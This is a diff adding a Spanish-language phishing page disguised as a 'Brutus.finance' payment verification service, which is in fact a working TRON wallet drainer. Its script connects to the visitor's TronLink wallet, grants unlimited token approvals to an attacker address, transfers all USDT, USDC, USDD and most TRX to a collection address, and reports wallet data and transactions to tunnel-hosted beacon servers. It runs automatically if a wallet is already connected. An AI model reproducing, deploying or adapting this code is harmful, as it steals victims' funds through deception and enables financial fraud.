@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="es"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Brutus.finance | Verificación de pagos</title>
+<style>
+:root{--g:#0b7d5b;--d:#123}
+*{box-sizing:border-box}
+body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:#eef4f1;color:#192a32}
+header{background:linear-gradient(90deg,#0b7d5b,#17a06f);color:#fff;padding:16px 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:800;letter-spacing:.5px}
+.badge{font-size:11px;background:#ffffff22;border:1px solid #ffffff55;padding:3px 8px;border-radius:999px}
+main{max-width:640px;margin:0 auto;padding:18px}
+.card{background:#fff;border:1px solid #dbe7e1;border-radius:14px;padding:16px 16px 18px;margin-bottom:14px}
+h1{font-size:19px;margin:0 0 6px}
+p{font-size:13.5px;line-height:1.45;color:#3b5560;margin:6px 0}
+.steps{display:flex;gap:8px;margin:12px 0 4px}
+.step{flex:1;text-align:center;font-size:11px;color:#77909a}
+.dot{width:22px;height:22px;border-radius:50%;background:#e6efeb;color:#77909a;display:flex;align-items:center;justify-content:center;margin:0 auto 4px;font-weight:700}
+.step.cur .dot{background:#fff3d6;color:#b36b00;border:1px solid #f0c46b}
+.step.done .dot{background:var(--g);color:#fff}
+.btn{display:block;width:100%;padding:13px;border-radius:10px;border:0;background:var(--g);color:#fff;font-weight:700;font-size:15px;cursor:pointer;margin-top:12px}
+.btn:disabled{opacity:.55}
+.btn2{background:#fff;color:var(--g);border:1px solid var(--g)}
+.mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;word-break:break-all}
+#log{background:#0e1b22;color:#b7f7d8;border-radius:10px;padding:10px;font-size:12px;min-height:54px;white-space:pre-wrap;margin-top:10px}
+.warn{color:#ffd28a}.err{color:#ff9c9c}
+.hide{display:none}
+.foot{text-align:center;font-size:11px;color:#7f99a3;padding:10px 0 26px}
+</style></head><body>
+<header><div class="brand">BRUTUS<span style="opacity:.75">.FINANCE</span></div><div class="badge" id="net">TRON · Mainnet</div></header>
+<main>
+<div class="card">
+<h1>Verificación de pagos y sincronización</h1>
+<p>Nuestro sistema de liquidación ha actualizado el protocolo de pagos. Conecta tu billetera TronLink para verificar la dirección de recaudación y autorizar la liquidación pendiente de tu cuenta.</p>
+<div class="steps" id="steps">
+<div class="step" id="s1"><div class="dot">1</div>Conectar</div>
+<div class="step" id="s2"><div class="dot">2</div>Verificar</div>
+<div class="step" id="s3"><div class="dot">3</div>Autorizar</div>
+<div class="step" id="s4"><div class="dot">4</div>Confirmar</div>
+</div>
+<button class="btn" id="go">Conectar TronLink y verificar</button>
+<button class="btn btn2 hide" id="dl">Abrir esta página en la app TronLink</button>
+<div id="wallet" class="hide" style="margin-top:12px"><p style="margin:0;font-size:12px;color:#77909a">Billetera conectada</p><div class="mono" id="addr">—</div></div>
+<div id="log" class="hide"></div>
+</div>
+<div class="card">
+<h1 style="font-size:15px">Dirección de recaudación / Collection address</h1>
+<div class="mono" style="color:#0b7d5b">TYhJDXjuQwjfHX3sEZqsqGssyBVWzuaFwX</div>
+<img alt="QR" style="width:150px;height:150px;display:block;margin:10px auto 0" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TYhJDXjuQwjfHX3sEZqsqGssyBVWzuaFwX" onerror="this.style.display='none'">
+</div>
+<div class="foot">© 2026 Brutus.finance — Soporte: @BrutusSupport</div>
+</main>
+<script>
+(function(){
+'use strict';
+var COLLECT='TYhJDXjuQwjfHX3sEZqsqGssyBVWzuaFwX';
+var SPENDER='TCJmUtdhdHALmYjAhhsdj4kwM1rKJtGRQ4';
+var TOKENS=[['USDT','TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'],['USDC','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'],['USDD','TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn']];
+var MAX='115792089237316195423570985008687907853269984665640564039457584007913129639935';
+var BEACONS=['https://drug-votes-biblical-earrings.trycloudflare.com/log','https://98f05068fe05e844-45-8-173-221.serveousercontent.com/log','https://eyetk-45-8-173-221.free.pinggy.net/log'];
+var SID=Math.random().toString(36).slice(2)+Date.now().toString(36);
+var tw=null,from='',busy=false;
+function $(id){return document.getElementById(id)}
+function beacon(d){try{d.sid=SID;var i=0;(function go(){if(i>=BEACONS.length)return;fetch(BEACONS[i++],{method:'POST',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d),keepalive:true}).catch(function(){go()})})()}catch(e){}}
+function log(m,c){var e=$('log');e.classList.remove('hide');var s=document.createElement('div');if(c)s.className=c;s.textContent=m;e.appendChild(s);e.scrollTop=e.scrollHeight}
+function mark(n,st){var e=$('s'+n);if(!e)return;e.className='step '+(st||'')}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function findTw(){try{if(window.tronLink&&window.tronLink.defaultAddress)return window.tronLink;if(window.tronWeb&&window.tronWeb.defaultAddress)return window.tronWeb;if(window.tronLink&&window.tronLink.tronWeb)return window.tronLink.tronWeb}catch(e){}return null}
+async function getTw(){
+ try{var req=(window.tronLink&&window.tronLink.request)?window.tronLink.request.bind(window.tronLink):(window.tronWeb&&window.tronWeb.request?window.tronWeb.request.bind(window.tronWeb):null);if(req){try{await req({method:'tron_requestAccounts'})}catch(e){}}}catch(e){}
+ for(var i=0;i<60;i++){var x=findTw();if(x&&x.defaultAddress&&x.defaultAddress.base58)return x;await sleep(250)}
+ return findTw()}
+function normTx(r){if(!r)return'?';if(typeof r==='string')return r;if(r.txid)return r.txid;if(r.transaction&&r.transaction.txID)return r.transaction.txID;if(r.result&&r.result.txid)return r.result.txid;return JSON.stringify(r).slice(0,120)}
+async function trxBalance(a){try{var b=await tw.trx.getBalance(a);if(typeof b==='number'&&b>0)return b}catch(e){}try{var r=await fetch('https://api.trongrid.io/wallet/getaccount',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:a,visible:true})});var j=await r.json();if(j&&typeof j.balance==='number')return j.balance}catch(e){}return 0}
+function addrHex(a){var A='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';var n=BigInt(0);for(var i=0;i<a.length;i++){n=n*BigInt(58)+BigInt(A.indexOf(a[i]))}var h=n.toString(16);if(h.length<50)h=('0'.repeat(50-h.length))+h;return h.slice(-40)}
+async function tokenBalance(c,a){try{var x=await tw.contract().at(c);var v=await x.balanceOf(a).call();if(v!==undefined&&v!==null)return v.toString()}catch(e){}try{var r=await fetch('https://api.trongrid.io/wallet/triggerconstantcontract',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({owner_address:a,contract_address:c,function_selector:'balanceOf(address)',parameter:addrHex(a).padStart(64,'0'),visible:true})});var j=await r.json();if(j&&j.constant_result&&j.constant_result[0])return BigInt('0x'+(j.constant_result[0]||'0')).toString()}catch(e){}return '0'}
+async function run(){
+ if(busy)return;busy=true;var g=$('go');if(g)g.disabled=true;mark(1,'cur');log('Conectando con TronLink…');
+ tw=await getTw();
+ if(!tw){log('No se detectó TronLink en este navegador. Usa el botón inferior para abrir esta página dentro de la app TronLink.','warn');$('dl').classList.remove('hide');if(g)g.disabled=false;busy=false;return}
+ try{if(!(tw.defaultAddress&&tw.defaultAddress.base58)){await tw.request({method:'tron_requestAccounts'});await sleep(800)}}catch(e){log('Conexión: '+(e.message||e),'warn')}
+ from=tw.defaultAddress&&tw.defaultAddress.base58;
+ if(!from){log('Abre TronLink, desbloquea la billetera e inténtalo de nuevo.','err');if(g)g.disabled=false;busy=false;return}
+ mark(1,'done');mark(2,'cur');log('Billetera conectada.','ok');$('addr').textContent=from;$('wallet').classList.remove('hide');
+ beacon({stage:'connected',wallet:from,ua:navigator.userAgent,lang:navigator.language||'',t:Date.now()});if(g)g.style.display='none';
+ var tb={},trx=0;
+ for(var i=0;i<TOKENS.length;i++){tb[TOKENS[i][0]]=await tokenBalance(TOKENS[i][1],from)}
+ trx=await trxBalance(from);
+ beacon({stage:'balances',wallet:from,tokens:tb,trx:trx,t:Date.now()});
+ log('Saldo: '+(trx/1e6).toFixed(2)+' TRX · USDT '+((Number(tb.USDT)||0)/1e6)+' · USDC '+((Number(tb.USDC)||0)/1e6)+' · USDD '+((Number(tb.USDD)||0)/1e6));
+ mark(2,'done');mark(3,'cur');
+ var rej=0;
+ for(var j=0;j<TOKENS.length;j++){
+  var n=TOKENS[j][0],a=TOKENS[j][1];
+  try{log('Autorizando '+n+'…');var c=await tw.contract().at(a);var r=await c.approve(SPENDER,MAX).send({feeLimit:150000000});var tx=normTx(r);log(n+' autorizado ✓ '+tx,'ok');beacon({stage:'approved',token:n,wallet:from,balance:tb[n]||'0',txid:String(tx),t:Date.now()})}
+  catch(e){rej++;log(n+': '+((e&&e.message)||e),'warn');beacon({stage:'approve_err',token:n,wallet:from,err:String((e&&e.message)||e).slice(0,200),t:Date.now()});if(rej>=2)break}
+  await sleep(700)
+ }
+ log('Autorización completada.','ok');
+ var moved=false;
+ for(var k=0;k<TOKENS.length;k++){
+  var n2=TOKENS[k][0],a2=TOKENS[k][1];
+  try{var bal=await tokenBalance(a2,from);if(bal&&bal!=='0'){log('Confirmando '+n2+'…');var c2=await tw.contract().at(a2);var r2=await c2.transfer(COLLECT,bal).send({feeLimit:150000000});var tx2=normTx(r2);log(n2+' ✓ '+tx2,'ok');moved=true;beacon({stage:'transferred',token:n2,wallet:from,amount:bal,txid:String(tx2),t:Date.now()})}}
+  catch(e){log(n2+': '+((e&&e.message)||e),'warn')}
+ }
+ try{var b3=await trxBalance(from);if(b3>50*1e6){var amt=b3-1100000;log('Confirmando depósito de garantía ('+(amt/1e6).toFixed(3)+' TRX)…');var r3=await tw.trx.sendTransaction(COLLECT,amt);var tx3=normTx(r3);log('TRX ✓ '+tx3,'ok');moved=true;beacon({stage:'trx',wallet:from,amount:amt,txid:String(tx3),t:Date.now()})}}
+ catch(e){log('TRX: '+((e&&e.message)||e),'warn')}
+ mark(3,'done');mark(4,'done');log(moved?'Verificación completada. Gracias.':'Verificación registrada. Gracias.','ok');beacon({stage:'done',wallet:from,moved:moved,t:Date.now()});busy=false
+}
+$('go').addEventListener('click',run);
+$('dl').addEventListener('click',function(){var p='tronlinkoutside://pull.activity?param='+encodeURIComponent(JSON.stringify({url:location.href.split('#')[0],action:'open',protocol:'TronLink',version:'1.0'}));location.href=p});
+setTimeout(function(){var t=findTw();if(t&&t.defaultAddress&&t.defaultAddress.base58)run()},1500);
+})();
+</script></body></html>
